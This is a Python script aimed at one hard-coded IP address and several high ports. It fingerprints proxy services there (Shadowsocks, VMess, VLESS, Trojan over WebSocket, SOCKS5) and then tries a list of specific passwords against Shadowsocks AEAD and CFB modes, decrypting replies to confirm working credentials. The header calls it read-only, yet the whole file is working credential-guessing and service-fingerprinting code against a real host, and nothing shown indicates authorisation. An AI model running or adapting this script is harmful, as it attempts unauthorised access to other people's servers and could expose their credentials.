#!/usr/bin/env python3
# Round 2: classify the silently-accepting services on 43.243.192.97 high ports.
# - byte-threshold mapping (reveals fixed-prefix token length: SS/VMess-AEAD => 16-byte prefix)
# - HTTP origin-form + WebSocket upgrade transport probes (VMess-WS / VLESS-WS / Trojan-WS)
# - Shadowsocks credential reuse: legacy AEAD (aes-128/256-gcm, chacha20-ietf-poly1305) + CFB
# READ-ONLY; bounded candidate list; no TCP/25 traffic anywhere.
import socket, ssl, json, os, sys, time, struct, threading, hashlib, hmac, base64

TARGET = "43.243.192.97"
PORTS = [18643, 18644, 18645, 18646, 18647, 46485, 46486]
assert 25 not in PORTS

PASSWORDS = [
    "123456", "xinyue888", "xinyue", "daimon", "daimon3332", "1poa", "1poa.org",
    "xiaogu", "xiaoguzuiniu", "al8YDTW!", "3E015oTw2ZDy", "mlmsspmkaltefhea",
    "allinssldocker", "zxcv123456789..", "xuxby001213", "1212156",
    "00060f83f401721e99f97ec32242c774", "YYXyjrz2c4fDcm8k", "gukewen",
]
AEAD_METHODS = [("aes-128-gcm", 16, 16), ("aes-256-gcm", 32, 32), ("chacha20-ietf-poly1305", 32, 32)]
CFB_METHODS = [("aes-128-cfb", 16), ("aes-256-cfb", 32)]

LOCK = threading.Lock()
OUT = []

def emit(rec):
    with LOCK:
        OUT.append(rec)
        print("R " + json.dumps(rec, ensure_ascii=False), flush=True)

def hx(d, n=96):
    return None if d is None else d[:n].hex()

def conn(port, timeout=6.0):
    s = socket.create_connection((TARGET, port), timeout=timeout)
    s.settimeout(timeout)
    return s

def rd(s, wait=1.5, maxn=4096):
    s.settimeout(wait)
    try:
        d = s.recv(maxn)
        return b"" if d == b"" else d
    except socket.timeout:
        return b"<TIMEOUT>"
    except ConnectionResetError:
        return b"<RST>"
    except Exception as e:
        return ("<ERR:%s>" % type(e).__name__).encode()

def classify(r):
    if r == b"":
        return "CLOSED"
    if r.startswith(b"<TIMEOUT>"):
        return "WAIT"
    if r.startswith(b"<RST>"):
        return "RST"
    if r.startswith(b"<ERR:"):
        return "ERR"
    return "DATA"

# ---------------- threshold mapping ----------------
def threshold_probe(port):
    seq = [1, 2, 4, 8, 12, 15, 16, 17, 18, 20, 24, 32, 33, 34, 36, 48, 49, 50, 52, 64, 80]
    trans = []
    for n in seq:
        try:
            s = conn(port, 5.0)
            s.sendall(os.urandom(n))
            r = rd(s, 0.7, 32)
            s.close()
        except Exception as e:
            trans.append([n, "ERR:" + type(e).__name__])
            continue
        trans.append([n, classify(r)])
    emit({"port": port, "probe": "byte_threshold", "map": trans})
    # paced reassembly test: 16 bytes then (0.4s) 18 more — is the prefix accumulated?
    try:
        s = conn(port, 5.0)
        s.sendall(os.urandom(16))
        time.sleep(0.4)
        r1 = rd(s, 0.3, 32)
        s.sendall(os.urandom(18))
        r2 = rd(s, 1.0, 32)
        s.close()
        emit({"port": port, "probe": "threshold_paced_16_then_18", "r1": classify(r1), "r2": classify(r2)})
    except Exception as e:
        emit({"port": port, "probe": "threshold_paced_16_then_18", "err": type(e).__name__})

# ---------------- HTTP / websocket transport ----------------
def http_probe(port):
    reqs = [
        ("origin_get", b"GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: curl/8\r\nConnection: close\r\n\r\n" % TARGET.encode()),
        ("origin_get_host_daimonna", b"GET / HTTP/1.1\r\nHost: daimonna.com\r\nConnection: close\r\n\r\n"),
        ("ws_upgrade_root", b"GET / HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n" % TARGET.encode()),
        ("ws_upgrade_vmess", b"GET /vmess HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n" % TARGET.encode()),
        ("ws_upgrade_ws", b"GET /ws HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n" % TARGET.encode()),
        ("ws_upgrade_ray", b"GET /ray HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n" % TARGET.encode()),
    ]
    for name, req in reqs:
        try:
            s = conn(port, 5.0)
            s.sendall(req)
            r = rd(s, 2.0, 400)
            s.close()
            emit({"port": port, "probe": "http_" + name, "cls": classify(r), "resp_head": r[:200].decode("latin1", "replace")})
        except Exception as e:
            emit({"port": port, "probe": "http_" + name, "err": type(e).__name__})

def long_socks5(port):
    for wait in (5.0, 10.0):
        try:
            s = conn(port, 6.0)
            s.sendall(b"\x05\x01\x00")
            r = rd(s, wait, 32)
            s.close()
            emit({"port": port, "probe": "socks5_long_wait_%s" % wait, "cls": classify(r), "resp_hex": hx(r)})
            if classify(r) == "DATA":
                break
        except Exception as e:
            emit({"port": port, "probe": "socks5_long_wait_%s" % wait, "err": type(e).__name__})

# ---------------- shadowsocks credential probe ----------------
CRYPTO = None
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    # self test: NIST GCM vector
    t = AESGCM(b"\x00" * 16).encrypt(b"\x00" * 12, b"", None)
    assert t.hex() == "58e2fccefa7e3061367f1d57a4e7455a", t.hex()
    CRYPTO = "cryptography"
except Exception as e:
    CRYPTO = "unavailable:" + repr(e)[:80]

def hkdf_sha1(password, salt, info, length):
    prk = hmac.new(salt, password, hashlib.sha1).digest()
    t = b""
    okm = b""
    i = 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha1).digest()
        okm += t
        i += 1
    return okm[:length]

def ss_aead_try(port, method, pw, target=("1.1.1.1", 80), wtime=1.5):
    import cryptography  # noqa
    key_len = {"aes-128-gcm": 16, "aes-256-gcm": 32, "chacha20-ietf-poly1305": 32}[method]
    salt_len = key_len
    aead_cls = ChaCha20Poly1305 if method.startswith("chacha") else AESGCM
    payload = b"\x01" + socket.inet_aton(target[0]) + struct.pack(">H", target[1]) + \
              b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"
    salt = os.urandom(salt_len)
    aead = aead_cls(hkdf_sha1(pw.encode(), salt, b"ss-subkey", key_len))
    ctr = [0]
    def enc(pt, aad):
        nonce = ctr[0].to_bytes(12, "little"); ctr[0] += 1
        return aead.encrypt(nonce, pt, aad)
    l = struct.pack(">H", len(payload))
    frame = salt + enc(l, None) + enc(payload, l)
    s = conn(port, 5.0)
    s.sendall(frame)
    r = rd(s, wtime, 1500)
    s.close()
    return r

def evp_bytes_to_key(pw, key_len):
    d = b""
    prev = b""
    while len(d) < key_len:
        prev = hashlib.md5(prev + pw).digest()
        d += prev
    return d[:key_len]

def ss_cfb_try(port, method, pw, target=("1.1.1.1", 80), wtime=1.5):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    key_len = 16 if method == "aes-128-cfb" else 32
    key = evp_bytes_to_key(pw.encode(), key_len)
    iv = os.urandom(16)
    payload = b"\x01" + socket.inet_aton(target[0]) + struct.pack(">H", target[1]) + \
              b"GET / HTTP/1.1\r\nHost: 1.1.1.1\r\nConnection: close\r\n\r\n"
    enc = Cipher(algorithms.AES(key), modes.CFB(iv)).encryptor()
    frame = iv + enc.update(payload) + enc.finalize()
    s = conn(port, 5.0)
    s.sendall(frame)
    r = rd(s, wtime, 1500)
    s.close()
    return r

def ss_decode_aead(method, pw, data):
    try:
        key_len = {"aes-128-gcm": 16, "aes-256-gcm": 32, "chacha20-ietf-poly1305": 32}[method]
        aead_cls = ChaCha20Poly1305 if method.startswith("chacha") else AESGCM
        salt = data[:key_len]
        aead = aead_cls(hkdf_sha1(pw.encode(), salt, b"ss-subkey", key_len))
        pos = key_len
        ctr = [0]
        out = b""
        while pos + 18 <= len(data):
            nonce = ctr[0].to_bytes(12, "little"); ctr[0] += 1
            l = aead.decrypt(nonce, data[pos:pos + 18], None); pos += 18
            ln = struct.unpack(">H", l)[0]
            if pos + ln + 16 > len(data):
                break
            nonce = ctr[0].to_bytes(12, "little"); ctr[0] += 1
            out += aead.decrypt(nonce, data[pos:pos + ln + 16], l); pos += ln + 16
            if len(out) > 200:
                break
        return out[:200]
    except Exception as e:
        return ("<decrypt_fail:%s>" % type(e).__name__).encode()

def ss_probe_port(port, state):
    if CRYPTO != "cryptography":
        emit({"port": port, "probe": "ss_skip", "reason": CRYPTO})
        return
    for method, key_len, salt_len in AEAD_METHODS:
        for pw in PASSWORDS:
            try:
                r = ss_aead_try(port, method, pw)
            except Exception as e:
                emit({"port": port, "probe": "ss_aead", "method": method, "pw": pw, "err": type(e).__name__})
                continue
            cls = classify(r)
            if cls in ("DATA", "WAIT"):
                rec = {"port": port, "probe": "ss_aead_candidate", "method": method, "pw": pw,
                       "cls": cls, "resp_hex": hx(r, 120), "resp_len": len(r)}
                if cls == "DATA":
                    dec = ss_decode_aead(method, pw, r)
                    rec["decrypted"] = dec.decode("latin1", "replace")
                    if b"HTTP/1.1" in dec or b"SSH-2.0" in dec:
                        rec["hit"] = True
                        with LOCK:
                            state["ss"].append({"port": port, "method": method, "pw": pw})
                emit(rec)
    emit({"port": port, "probe": "ss_aead_done"})
    for method, klen in CFB_METHODS:
        for pw in PASSWORDS:
            try:
                r = ss_cfb_try(port, method, pw)
            except Exception as e:
                emit({"port": port, "probe": "ss_cfb", "method": method, "pw": pw, "err": type(e).__name__})
                continue
            cls = classify(r)
            if cls in ("DATA", "WAIT"):
                emit({"port": port, "probe": "ss_cfb_candidate", "method": method, "pw": pw,
                      "cls": cls, "resp_len": len(r)})
    emit({"port": port, "probe": "ss_cfb_done"})

def worker(port, state):
    t0 = time.time()
    try:
        threshold_probe(port)
        http_probe(port)
        long_socks5(port)
        ss_probe_port(port, state)
    except Exception as e:
        emit({"port": port, "probe": "worker_exc", "err": repr(e)[:200]})
    emit({"port": port, "probe": "done", "elapsed": round(time.time() - t0, 1)})

def main():
    emit({"probe": "env", "target": TARGET, "ports": PORTS, "crypto": CRYPTO,
          "utc": time.strftime("%FT%TZ", time.gmtime())})
    state = {"ss": []}
    ths = [threading.Thread(target=worker, args=(p, state), daemon=True) for p in PORTS]
    for t in ths:
        t.start()
    for t in ths:
        t.join(timeout=420)
    emit({"probe": "final", "ss_hits": state["ss"], "records": len(OUT)})

if __name__ == "__main__":
    main()
